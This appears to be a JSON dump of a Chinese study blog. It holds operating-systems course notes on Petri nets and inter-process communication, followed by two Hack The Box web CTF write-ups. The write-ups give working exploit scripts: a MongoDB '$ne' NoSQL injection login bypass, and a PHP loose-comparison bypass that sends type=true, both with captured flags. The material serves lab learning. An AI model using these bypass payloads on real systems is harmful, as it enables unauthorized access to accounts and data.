操作系统","slug":"TUM-info-课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"Mutex","slug":"Mutex","permalink":"https://archer-baiyi.github.io/tags/Mutex/"},{"name":"Semaphore","slug":"Semaphore","permalink":"https://archer-baiyi.github.io/tags/Semaphore/"}]},{"title":"GBS 4 Modellierung Paralleler Systeme 并行系统建模","slug":"TUM info 笔记/GBS/GBS-4-Modellierung-Paralleler-Systeme-并行系统建模","date":"2025-04-03T21:20:18.000Z","updated":"2025-04-26T18:30:55.451Z","comments":true,"path":"2025/04/03/TUM info 笔记/GBS/GBS-4-Modellierung-Paralleler-Systeme-并行系统建模/","permalink":"https://archer-baiyi.github.io/2025/04/03/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-4-Modellierung-Paralleler-Systeme-%E5%B9%B6%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%BB%BA%E6%A8%A1/","excerpt":"操作系统基础相关笔记","text":"Parallele Systeme并行系统（Parallele Systeme）的一些特性（Eigenschaften）： 确定性（Determiniertheit）： 在相同条件下，产生相同的结果。 无干扰性（Störungsfreiheit）： 在遵守既定的并行事件执行顺序的前提下，结果不受影响。 互斥访问资源（Wechselseitiger Ausschluss exklusiv nutzbarerer Ressourcen，mutual exclusion）： 每一时刻最多只有一个进程可以访问共享资源（该资源被独占使用）。 无死锁（Verklemmungsfreiheit，Deadlock free）： 没有多个进程间的循环等待情况。 无饥饿（Kein Verhungern，Starvation free）： 不会有进程因为被一直推迟执行而永远得不到资源。 我们这里主要关注一个用于形式建模的方法：Petri-Netze。 Petri-NetzePetri-Netze主要是关注状态以及状态变化（Zuständen und Zustandsüberg.ngen）。 首先先来看定义： 一个 Petri 网是一个三元组 (S, T, F)，其中： S：有限集合，称为“Stellen”（位置 / 状态） 用圆圈表示。 表示被动元素，例如：存储单元、资源。 T：有限集合，称为“Transitionen”（变迁 / 转换） 用矩形表示。 表示主动元素，例如：处理器、事件、过程。 F：流关系（Flussrelation） $F \\subseteq (S \\times T) \\cup (T \\times S)$ 用有向边（gerichtete Kanten）表示。 并且满足：$S \\cap T = \\emptyset$ 。 每个Knote $x \\in (S \\cup T)$的 Vorbedingung 指的是：$\\bullet x := \\{ \\ y \\ | \\ y \\ F \\ x\\ \\}$，即能到x的点 Nachbedingung 指的是：$ x \\bullet := \\{ \\ y \\ | \\ x \\ F \\ y\\ \\}$，即x能到的点。 例子： 和其他的建图一样，我们这里也可以定义带有标记（即容量，权重等）的图： Kapazität einer Stelle：$c : S \\to \\mathbb{N}_0 \\cup \\{\\infty\\}$ 如果没有专门标记出来，则默认 $\\infty$。 Gewichtung einer Kante：$w : F \\to \\mathbb{N}_0$ 如果没有专门标记出来，则默认 $1$。 一个位置-变迁网（Stellen-Transitionsnetz）里除了上面提到的2个函数还需要一个函数 $M : S \\to \\mathbb{N}_0 \\cup \\{\\infty\\}$ 用于描述图当前的状态（Aktuelle Belegung des Netzes），即每个Stelle里的Token数量。 需要满足 $\\forall s \\in S: M(s) \\leq c(s)$。 一个位置-变迁网（Stellen-Transitionsnetz）叫做Bedingungs/Ereignisnetz 或 Boolesches Netz（布尔网络），当$M : S \\to \\mathbb{B}$ ，也就是说每个Stelle里最多可以有1个Token。 触发规则（Schaltregel）一开始我们就提到，我们的关注点主要是系统的状态以及状态的变化。在前面介绍的内容中，函数 $M$ 被用来描述系统的当前状态，而我们希望通过 $T$（即Transitionen的集合）来描述状态的变化过程。不过，任何状态的变化都必须满足一定的前提条件。那么接下来我们就来看看，在 Petri 网中，这些条件是如何被定义的。 给定一个位置-变迁网（Stellen-Transitionsnetz），即一个Petri-Netz (S, T, F)，函数 $c, w, M$。 一个Transition $t \\in T$ 可以触发（kann schalten）当： $\\forall s \\in \\bullet t: M(s) \\geq w(s, t) $ $\\forall s \\in t\\bullet: M(s) \\leq c(s) - w(t, s)$ 即当： 到 t 的Stelle里有足够的Token（至少 $w(s, t)$ 个） t 能到的所有Stelle里有足够的空位给 $w(t, s)$ 个Token 时才能触发 t 。 这个t触发后整个图的状态会变成$M’$： $\\forall s \\in \\bullet t \\setminus t\\bullet: M’(s) = M(s) - w(s, t)$ $\\forall s’ \\in t\\bullet \\setminus \\bullet t: M’(s’) = M(s’) + w(t, s’)$ $\\forall s’’ \\in \\bullet t \\cap t\\bullet: M’(s’’) = M(s’’) - w(s’’, t) + w(t, s’’)$ 例子： 因为没有专门标记出来，所以默认Kapazität是 $\\infty$，Gewicht是1。 不能Schalten的例子： 因为后面那里已经没有空余的位置了。 这个同样不行，因为这里Schalten需要考虑3个地方： 左边的s是否有足够的（1个）Token来触发t 左边的s是否有足够的空闲位置 右边的s是否有足够的空闲位置 很明显第二点并不满足。 注意，这里不能想着说反正左边的token会在触发 t 的时候被消耗掉所以就有足够的空闲位置！！！ 一定要所有的前提条件都满足了才能触发 t 。 接下来我们来看一下怎么样可以通过建模出来的图判断当前系统的一些属性： 并发性 / 并行性（Nebenläufigkeit，Concurrency）两个Transitionnen $t_0$ 和 $t_1$ 是并发的（nebenläufig），当它们可以互不干扰地独立触发（unabhängig von einander schalten können, ohne sich gegenseitig zu beeinflussen.）。 例子： 可以看到，这里的 $t_1$ 和 $t_2$ 是并发的（nebenläufig），但 $t_1, t_2$ 和 $t_3$ 明显不是，因为 $t_3$ 只有在 $t_1, t_2$ 被触发后才能被触发。 不确定性（Nichtdeterminismus）不确定性表示在给定的标记状态 $M$ 下，可能会出现关于Transitionen可触发性的冲突。 而 $t_0$ 和 $t_1$ 处于冲突中（stehen im Konflikt），当它们共享输入或输出的位置，并且这些位置的 token 数量只能满足其中一个Transition的触发条件。 如果token的数量足够触发所有的Transitionen那就不算有冲突，整个图也是确定的（deterministisch）。 这样会导致进行一次不确定的选择（nichtdeterministische Auswahl）。 例子： 这里的 $t_1$ 和 $t_3$ 冲突了，因为s1里只有1个token，所以要么触发 $t_1$ ，要么触发 $t_3$。 可到达性（Erreichbarkeit）给定一个一个Petri-Netz (S, T, F) ，c，w，以及一个初始状态 $M_0$ 。 那么一个有限序列（endliche Sequenz）$\\rho = t_0, t_1,…, t_n \\ (\\text{with } t_i \\in T)$ 被叫做由 $M_0$ 激活的有限切换序列（von M aktivierteendliche Schaltfolge），当存在 $M_1, M_2,… M_n$ 使得： M_0 \\xrightarrow{t_0} M_1 \\xrightarrow{t_1} \\dots \\xrightarrow{t_n} M_n, \\text{ 即 } M_0 \\xrightarrow{\\rho} M_n如果存在一个有限序列使得 $M$ 能变成 $M’$ ，那么我们就说 $M’$ ist von $M$ erreichbar。 针对这个Erreichbarkeit我们可以再建立个图，叫做 Erreichbarkeitsgraph。里面的点表示 Belegung，有向边表示 Transition。 例子： 它对应的Erreichbarkeitsgraph： 记得左上角的这个有向边一定要画！ 注意：每个Petri-Netz会有着唯一的一个Erreichbarkeitsgraph，但一个Erreichbarkeitsgraph可能会对应很多个Petri-Netz，因为可能存在一些永远无法触发的Transitionen（这些无法触发的Transitionen完全不会改变Erreichbarkeitsgraph）。 Lebendigkeit（liveness）给定一个一个Petri-Netz (S, T, F) ，c，w，以及一个初始状态 $M_0$ 。 它是活跃的（lebendig），当对于所有 $t \\in T$ 都满足以下条件： 对于所有从 $M_0$ 可到达的状态 $M_1$，存在一个后续状态 $M_2$， 使得 $t$ 在 $M_2$ 中可以触发，且 $M_2$ 是从 $M_1$ 可达的，即 \\forall M_1 \\text{ with } M_0 \\xrightarrow{\\rho_1} M_1: \\quad \\exists \\rho_2, M_2 \\text{ s.t. } M_1 \\xrightarrow{\\rho_2} M_2 \\xrightarrow{t}死锁（Verklemmung, Deadlock）给定一个一个Petri-Netz (S, T, F) ，c，w，以及一个初始状态 $M_0$ 。 从 $M_0$ 出发可达的某个标记 $M$，称为完全死锁状态（vollständige Verklemmung），如果在该状态下没有任何Transition $t \\in T$ 可以触发。 如果一个Netz是lebendig的，那么它一定是verklemmungsfrei。（lebendig $\\Rightarrow$ verklemmungsfrei） 但一个Netz是verklemmungsfrei不一定能够说明它也是lebendig的。（verklemmungsfrei $\\nRightarrow$ lebendig ） Verhungern（Starvation），Fariness给定一个一个Petri-Netz (S, T, F) ，c，w，以及一个初始状态 $M_0$ 。 Eine Transaktion t ∈ T verhungert, 当存在一个无线序列使得t尽管处于可触发的状态但是只被触发了有限次。（wenn es eine unendliche Sequenz gibt, in der t trotz Transitionsbereitschaft nur endlich oft auftritt.） 注意这里的前提条件“处于可触发的状态”非常重要，这个如果不满足那么就不能叫verhungert。 一个Netz是公平的（fair）的，当不存在某个无限序列（例如 $t_0 \\to t_4 \\to t_1 \\to \\dots$），使得变迁 $t$ 虽然始终处于可触发状态，却永远没有或只有有限次被实际触发。 所以如果一个Netz是公平的，那么就没有Transition会挨饿（verhungert）。 例子： 这个Netz是不公平的（unfair），因为存在 $t_0 \\to t_0 \\to t_0 \\to \\dots$ ，即 $t_1$ 会挨饿； $t_1 \\to t_1 \\to t_1 \\to \\dots$ ，即 $t_0$ 会挨饿； 例子： 这个图是： nicht lebendig 因为t0只能被触发一次。 deadlockfrei 进到右边那个圈里之后永远都可以有后续操作。 fair 因为t0触发一次之后不可能再进入准备就绪的状态，所以不算挨饿。","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM-info-课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"Petri-Netz","slug":"Petri-Netz","permalink":"https://archer-baiyi.github.io/tags/Petri-Netz/"}]},{"title":"GBS 5 Inter-Prozesskommunikation (IPC) 进程间通信","slug":"TUM info 笔记/GBS/GBS-5-Inter-Prozesskommunikation-IPC-进程间通信","date":"2025-04-03T21:19:45.000Z","updated":"2025-04-26T18:31:01.019Z","comments":true,"path":"2025/04/03/TUM info 笔记/GBS/GBS-5-Inter-Prozesskommunikation-IPC-进程间通信/","permalink":"https://archer-baiyi.github.io/2025/04/03/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-5-Inter-Prozesskommunikation-IPC-%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/","excerpt":"操作系统基础相关笔记","text":"[toc] 无连接通信（Verbindungslose Kommunikation）无连接通信（Verbindungslose Kommunikation）的通道（Kanäle）可以按照带宽（Bandbreite）分成2种： 窄带通道（Schmalbandige Kanäle） 宽带通道（Breitbandige Kanäle） 窄带通道（Schmalbandige Kanäle）窄带通道（Schmalbandige Kanäle）只传输少量信息（wenige Bits），主要用于事件的通知（Melden von Ereignissen）。它需要同步机制和中断机制（Synchronisationskonzepte und Unterbrechungskonzepte ）来确保通信的可靠性。 Linux里的例子：Signals 进程可以互相发送信号（使用 kill() ） 进程可以显式捕获这些信号（使用 signal() ）： 可以通过注册一个信号处理函数（signal handler）来处理信号 也忽略该信号（使用 SIG_IGN） 如果一个进程没有捕获（abfangen）信号，那么操作系统会终止（beendet）该进程。 SIGKILL 和 SIGSTOP 是不能被捕获的，这些信号会强制终止或暂停进程，进程无法阻止或忽略它们 kill()函数的用法： kill(pid, signal)，其中pid是进程ID，signal是具体要发送的信号，可选的有： 信号名 作用说明 SIGHUP 终端挂起或控制进程终止，常用于重新加载配置 SIGINT 中断（通常来自 Ctrl+C） SIGILL 非法指令，通常是程序错误导致 SIGABRT 异常终止（由 abort() 触发） SIGKILL 强制终止，无法被捕获或忽略 SIGUSR1 用户自定义信号 1 SIGSEGV 段错误（Segmentation Fault） SIGUSR2 用户自定义信号 2 SIGPIPE 管道破裂（写入没有读取端的 pipe） SIGALRM 定时器信号（alarm() 到期触发） SIGTERM 正常终止请求，默认的 kill 信号 SIGCHLD 子进程结束时通知父进程 SIGCONT 恢复被停止的进程 SIGSTOP 强制停止，无法被捕获或忽略 SIGTSTP 终端停止信号（Ctrl+Z） 代码示例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;// 信号处理函数：当接收到信号时执行void sighandler(int sig) &#123; printf(&quot;Caught signal %d\\n&quot;, sig); // 重新注册信号处理器（旧版 signal API 需要这样做） signal(SIGINT, sighandler); // Ctrl+C signal(SIGALRM, sighandler); // alarm() 触发的定时器信号&#125;int main(int argc, char *argv[], char *envp[]) &#123; char buffer[1024]; // 用于存储用户输入 int len; // 注册信号处理函数 signal(SIGINT, sighandler); // 捕获 Ctrl+C signal(SIGALRM, sighandler); // 捕获定时器 alarm 信号 // 设置一个定时器，5 秒后发送 SIGALRM 信号 alarm(5); // 第一阶段：每秒打印一次计数，持续 10 秒 for (len = 0; len &lt; 10; len++) &#123; printf(&quot;Counting %d...\\n&quot;, len); sleep(1); // 每秒暂停 &#125; // 第二次定时器设置，在 10 秒后发送另一个 SIGALRM alarm(10); // 第二阶段：进入一个循环，从标准输入读取用户输入 while (1) &#123; // 从标准输入读取内容（阻塞式） len = read(0, buffer, sizeof(buffer) - 1); if (len == -1) &#123; // 读取失败，打印错误并继续 perror(&quot;read() failed&quot;); continue; &#125; if (len == 0) &#123; // 读到 EOF（比如输入 Ctrl+D），退出程序 printf(&quot;Exiting\\n&quot;); exit(0); &#125; buffer[len] = &#x27;\\0&#x27;; // 添加字符串结尾符 // 如果用户输入的是 &quot;exit&quot;，退出程序 if (!strncmp(buffer, &quot;exit&quot;, 4)) &#123; exit(0); &#125; // 把用户输入的内容原样输出回终端 write(1, buffer, strlen(buffer)); &#125; return 0;&#125; 输出示例： 12345678910111213Counting 0...Counting 1......Counting 4...Caught signal 14 &lt;-- alarm(5) 到时触发 SIGALRMCounting 5......Counting 9...hello, world &lt;-- 用户输入hello, world &lt;-- 程序回显Caught signal 14 &lt;-- alarm(10) 又触发了 SIGALRM^C Caught signal 2 &lt;-- 用户按了 Ctrl+C，触发 SIGINT (signal 2)exit &lt;-- 用户输入 exit，触发退出 宽带通道（Breitbandige Kanäle） 宽带通道（Breitbandige Kanäle）用于传输大量数据，可以根据通信的方式进一步划分为： 隐式通信（Implizite Kommunikation） 显式通信（Explizite Kommunikation） 隐式通信（Implizite Kommunikation）隐式通信（Implizite Kommunikation）是通过共享资源实现的，比如说内存、寄存器、文件、环形缓冲区等。 优点：简单快速，因为不需要不需要在不同地址空间（Adressräumen）之间复制数据。 缺点：不一定一直都有共享区域可以用；可能会出现 busy-waiting，所以需要额外的同步机制。 （第三章的内容就是在讲这个） 而隐式通信（Implizite Kommunikation） 可以进一步划分为： 同步通信（Synchrone Kommunikation） 发送方或接收方可能需要等待对方。 比如说共享内存并且设置了同步机制。 异步通信（Asynchrone Kommunikation） 发送和接收可以独立进行。 比如说通过共享的文件进行kommunizieren。 显式通信（Explizite Kommunikation）显式通信（Explizite Kommunikation）则是我们比较熟悉的：发送/接收信息。适用于地址空间（Adressräumen）分离的进程（比如两个互不相干的进程），不过是与操作系统的直接交互。 这种通信可以是本地的也可以是远程的。 一般信息由2部分组成： 消息头（Nachrichtenkopf，header）：包含管理信息，比如说发送者、接收者的标识、消息大小等。 消息体（Nachrichtenkörper）：有效载荷（payload），也就是真正的信息内容。 流程： 进程使用 send() 发送消息 操作系统的消息服务负责传递该消息 接收方进程使用 recv() 接收该消息 而显式通信（Explizite Kommunikation） 同样可以进一步划分为： 同步通信（Synchrone Kommunikation） 发送方或接收方可能需要等待对方 异步通信（Asynchrone Kommunikation） 发送和接收可以独立进行 这其中又有2种消息通信的模式（Muster）： 消息通知（Meldung） 是单向的（unidirectional），通常只是传递少量数据，比如说通知状态变化。 任务（Auftrag） 是双向的（bidirectional），比如说查询某些数据，请求发送后收到包含数据的响应。 Asynchron的优点： 在实时系统中非常有用，当发送进程不能被阻塞时； 允许发送方和接收方并行处理任务； 适合用于事件的通知/信号传递。 Asynchron的缺点： 操作系统有管理负担（需要消息缓冲区来存储异步数据） 错误处理更复杂： 无法直接通知发送方是否成功； 数据包可能丢失（当缓冲区满了，尤其是网络通信中）； 有时需要重传数据包。 在实际应用中，异步通信更常用，特别适用于不确定接收方是否在线、或者无法预测响应时间的情况。 可以使用线程来结合同步与异步通信（比如：主线程同步处理、子线程异步等待）。 Asynchrone Meldung： 只发不等 Synchrone Meldung： 等待对方确认收到 流程： 接收方在收到消息后会发送一个确认（Bestätigung） 发送方在发送完消息后会等待接收确认（Empfangsbestätigung） 确认消息不包含实际数据，仅用于同步。 另一种方法：Rendezvous-Verfahren： 在交换消息之前，发送方与接收方都要事先准备好进行发送和接收 这样一来消息不需要缓冲 Asynchrone Auftrag： 各发各的 任务（Auftrag）和结果（Resultat）是作为两个独立的消息发送的。 Synchrone Auftrag： 等待对方回复 Streams流（Stream）是对连接（Verbindung）的一种抽象。 消息在传输过程中被缓冲，所有消息被整合为逻辑上的字节流（byte stream）。 操作系统可以建立/关闭连接，或者是在流中进行读/写操作。 C++头文件中的 1#include &lt;iostream&gt; 指的就是这个。 而管道（Pipes）正是流（Stream）的实现。 管道是一个单向的流（unidirektionaler Strom）。双向通信可以用两个管道来模拟。管道实现先进先出（FIFO） 的数据传输模型。 管道（Pipes）一般分为2种： （匿名）管道 pipe() 函数会创建一个管道，它返回两个文件描述符，分别用于读和写。 可以在 fork() 创建子进程时，把其中一端交给子进程，实现进程间通信，或者在不同的线程之间使用。 命名管道（Named Pipes） 用于多个进程之间的通信，它们有自己的名字，在文件系统中可见。 代码示例： 123456789int main() &#123; int p[2]; // p[0]: 读端, p[1]: 写端 pipe(p); // 创建一个匿名管道 sendData(p[1]); // 写数据到管道 receiveData(p[0]); // 从管道中读取数据 return 0;&#125; 1234567891011void sendData(int fd) &#123; const char *msg = &quot;Hello, world&quot;; // 要发送的消息 uint16_t len = strlen(msg); // 消息长度（不含 \\0） uint16_t nLen = htons(len); // 转换为网络字节序（大端） // 先发送长度，确保接收端知道后面要读取多少字节 send(fd, &amp;nLen, sizeof(nLen), 0); // 再发送消息本体 send(fd, msg, len, 0);&#125; 123456789101112131415void receiveData(int fd) &#123; char msg[1024]; // 接收缓冲区 uint16_t nLen; // 网络字节序长度 uint16_t len; // 主机字节序长度 // 先接收长度信息（2字节） recv(fd, &amp;nLen, sizeof(nLen), 0); len = ntohs(nLen); // 转换为主机字节序 // 接收实际消息内容（len 字节） recv(fd, msg, len, 0); msg[len] = &#x27;\\0&#x27;; // 手动加上字符串结束符 printf(&quot;接收到 %u 字节：%s\\n&quot;, len, msg);&#125; 例题例题1Für wehlche der folgenden IPC-Mechanismen wird in der Regel ein Filedescriptor verwendent? Sockets Shared Memory Anon. Pipes Named Pipes Signals 答案：1，3，4。","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM-info-课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"synchron","slug":"synchron","permalink":"https://archer-baiyi.github.io/tags/synchron/"},{"name":"asynchron","slug":"asynchron","permalink":"https://archer-baiyi.github.io/tags/asynchron/"},{"name":"signal","slug":"signal","permalink":"https://archer-baiyi.github.io/tags/signal/"}]},{"title":"HTB CandyVault Writeup","slug":"CTF/Web/HTB-CandyVault-Writeup","date":"2025-04-03T10:49:04.000Z","updated":"2025-04-03T10:57:36.233Z","comments":true,"path":"2025/04/03/CTF/Web/HTB-CandyVault-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/03/CTF/Web/HTB-CandyVault-Writeup/","excerpt":"","text":"题目描述 （有附件） 观察打开网页： 查看源代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from flask import Flask, Blueprint, render_template, redirect, jsonify, requestfrom flask_bcrypt import Bcryptfrom pymongo import MongoClientapp = Flask(__name__)app.config.from_object(&quot;application.config.Config&quot;)bcrypt = Bcrypt(app)client = MongoClient(app.config[&quot;MONGO_URI&quot;])db = client[app.config[&quot;DB_NAME&quot;]]users_collection = db[&quot;users&quot;]@app.errorhandler(Exception)def handle_error(error): message = error.description if hasattr(error, &quot;description&quot;) else [str(x) for x in error.args] response = &#123; &quot;error&quot;: &#123; &quot;type&quot;: error.__class__.__name__, &quot;message&quot;: message &#125; &#125; return response, error.code if hasattr(error, &quot;code&quot;) else 500@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;/login&quot;, methods=[&quot;POST&quot;])def login(): content_type = request.headers.get(&quot;Content-Type&quot;) if content_type == &quot;application/x-www-form-urlencoded&quot;: email = request.form.get(&quot;email&quot;) password = request.form.get(&quot;password&quot;) elif content_type == &quot;application/json&quot;: data = request.get_json() email = data.get(&quot;email&quot;) password = data.get(&quot;password&quot;) else: return jsonify(&#123;&quot;error&quot;: &quot;Unsupported Content-Type&quot;&#125;), 400 user = users_collection.find_one(&#123;&quot;email&quot;: email, &quot;password&quot;: password&#125;) if user: return render_template(&quot;candy.html&quot;, flag=open(&quot;flag.txt&quot;).read()) else: return redirect(&quot;/&quot;) 发现使用了MongoDB进行验证： 1234user = users_collection.find_one(&#123;&quot;email&quot;: email, &quot;password&quot;: password&#125;) if user: return render_template(&quot;candy.html&quot;, flag=open(&quot;flag.txt&quot;).read()) 如果在数据库里找到了对应的用户信息则登陆成功返回flag。 渗透利用MongoDB的漏洞进行注入。我们发送以下内容： 123456789101112131415import requestsurl = &quot;http://94.237.53.247:51317/login&quot;payload = &#123; &quot;email&quot;: &#123;&quot;$ne&quot;: None&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: None&#125;&#125;response = requests.post(url, json=payload)print(&quot;Response Body:\\n&quot;, response.text)# &lt;body&gt;# &lt;p data-text=&quot;HTB&#123;s4y_h1_t0_th3_c4andy_v4u1t!&#125;&quot;&gt;HTB&#123;s4y_h1_t0_th3_c4andy_v4u1t!&#125;&lt;/p&gt;# &lt;/body&gt; 这样一来MongoDB里的查询会被解释成： 1&#123;&quot;email&quot;: &#123;&quot;$ne&quot;: null&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125;&#125; 也就是说会查找 email 不为 null 且 password 不为 null 的任意用户。这样便可以绕过登录验证。 得到flag：HTB{s4y_h1_t0_th3_c4andy_v4u1t!} 。 也可以发送： 1234payload = &#123; &quot;email&quot;: &#123;&quot;$ne&quot;: 0&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: 0&#125;&#125; 是一样的。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"MongoDB","slug":"MongoDB","permalink":"https://archer-baiyi.github.io/tags/MongoDB/"},{"name":"注入","slug":"注入","permalink":"https://archer-baiyi.github.io/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"HTB Juggling facts Writeup","slug":"CTF/Web/HTB-Juggling-facts-Writeup","date":"2025-04-02T22:46:14.000Z","updated":"2025-04-02T23:05:45.552Z","comments":true,"path":"2025/04/03/CTF/Web/HTB-Juggling-facts-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/03/CTF/Web/HTB-Juggling-facts-Writeup/","excerpt":"","text":"题目描述 （有附件） 观察打开网页： 点击 secret facts： flag大概率和这个“secrets”有关系，但其他没有什么发现所以去看看源代码。在 index.php 里 123456789101112131415161718&lt;?php spl_autoload_register(function ($name) &#123; if (preg_match(&#x27;/Controller$/&#x27;, $name)) &#123; $name = &quot;controllers/$&#123;name&#125;&quot;; &#125; elseif (preg_match(&#x27;/Model$/&#x27;, $name)) &#123; $name = &quot;models/$&#123;name&#125;&quot;; &#125; include_once &quot;$&#123;name&#125;.php&quot;;&#125;);$database = new Database(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;M@k3l@R!d3s$&#x27;, &#x27;web_juggling_facts&#x27;);$database-&gt;connect();$router = new Router();$router-&gt;new(&#x27;GET&#x27;, &#x27;/&#x27;, &#x27;IndexController@index&#x27;);$router-&gt;new(&#x27;POST&#x27;,&#x27;/api/getfacts&#x27;, &#x27;IndexController@getfacts&#x27;);die($router-&gt;match()); 可以发现网页定义了2个操作：get和post。2者都调用了 IndexController ，所以我们顺着这个线索去看一下 IndexController.php： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpclass IndexController extends Controller&#123; public function __construct() &#123; parent::__construct(); &#125; public function index($router) &#123; $router-&gt;view(&#x27;index&#x27;); &#125; public function getfacts($router) &#123; $jsondata = json_decode(file_get_contents(&#x27;php://input&#x27;), true); if ( empty($jsondata) || !array_key_exists(&#x27;type&#x27;, $jsondata)) &#123; return $router-&gt;jsonify([&#x27;message&#x27; =&gt; &#x27;Insufficient parameters!&#x27;]); &#125; if ($jsondata[&#x27;type&#x27;] === &#x27;secrets&#x27; &amp;&amp; $_SERVER[&#x27;REMOTE_ADDR&#x27;] !== &#x27;127.0.0.1&#x27;) &#123; return $router-&gt;jsonify([&#x27;message&#x27; =&gt; &#x27;Currently this type can be only accessed through localhost!&#x27;]); &#125; switch ($jsondata[&#x27;type&#x27;]) &#123; case &#x27;secrets&#x27;: return $router-&gt;jsonify([ &#x27;facts&#x27; =&gt; $this-&gt;facts-&gt;get_facts(&#x27;secrets&#x27;) ]); case &#x27;spooky&#x27;: return $router-&gt;jsonify([ &#x27;facts&#x27; =&gt; $this-&gt;facts-&gt;get_facts(&#x27;spooky&#x27;) ]); case &#x27;not_spooky&#x27;: return $router-&gt;jsonify([ &#x27;facts&#x27; =&gt; $this-&gt;facts-&gt;get_facts(&#x27;not_spooky&#x27;) ]); default: return $router-&gt;jsonify([ &#x27;message&#x27; =&gt; &#x27;Invalid type!&#x27; ]); &#125; &#125;&#125; 稍微拆解分析一下，如果我们发送一个post请求，那么它 首先会检查请求参数是否存在： 1if ( empty($jsondata) || !array_key_exists(&#x27;type&#x27;, $jsondata) ) 判断 type 类型，如果是secrets那么检查是否是本地 IP 1if ($jsondata[&#x27;type&#x27;] === &#x27;secrets&#x27; &amp;&amp; $_SERVER[&#x27;REMOTE_ADDR&#x27;] !== &#x27;127.0.0.1&#x27;) 比较type的值并进行后续操作： 12345switch ($jsondata[&#x27;type&#x27;]) &#123; case &#x27;secrets&#x27;: case &#x27;spooky&#x27;: case &#x27;not_spooky&#x27;:&#125; 渗透漏洞正是这个流程里的 switch() 函数。php里的这个比较函数是宽松比较（loose comparison）（严格的话是===），会根据情况自动转换类型，所以可以利用true绕过： 1234567891011121314151617181920&lt;?php$jsondata = [ &#x27;type&#x27; =&gt; true];switch ($jsondata[&#x27;type&#x27;]) &#123; case &#x27;secrets&#x27;: echo &quot;true == secrets\\n&quot;; break; case &#x27;spooky&#x27;: echo &quot;Failed\\n&quot;; break; case &#x27;not_spooky&#x27;: echo &quot;Failed\\n&quot;; break; default: echo &quot;Failed\\n&quot;; break;&#125; 会返回： 1true == secrets 所以我们直接发送： 123456789101112131415import requestsurl = &#x27;http://94.237.63.28:34695/api/getfacts&#x27;data = &#123; &quot;type&quot;: True&#125;resp = requests.post(url, json=data) print(&quot;Response:&quot;)print(resp.text)# 返回：# Response:# &#123;&quot;facts&quot;:[&#123;&quot;id&quot;:19,&quot;fact&quot;:&quot;HTB&#123;juggl1ng_1s_d4ng3r0u5!!!&#125;&quot;,&quot;fact_type&quot;:&quot;secrets&quot;&#125;]&#125; 就可以得到flag：HTB{juggl1ng_1s_d4ng3r0u5!!!} 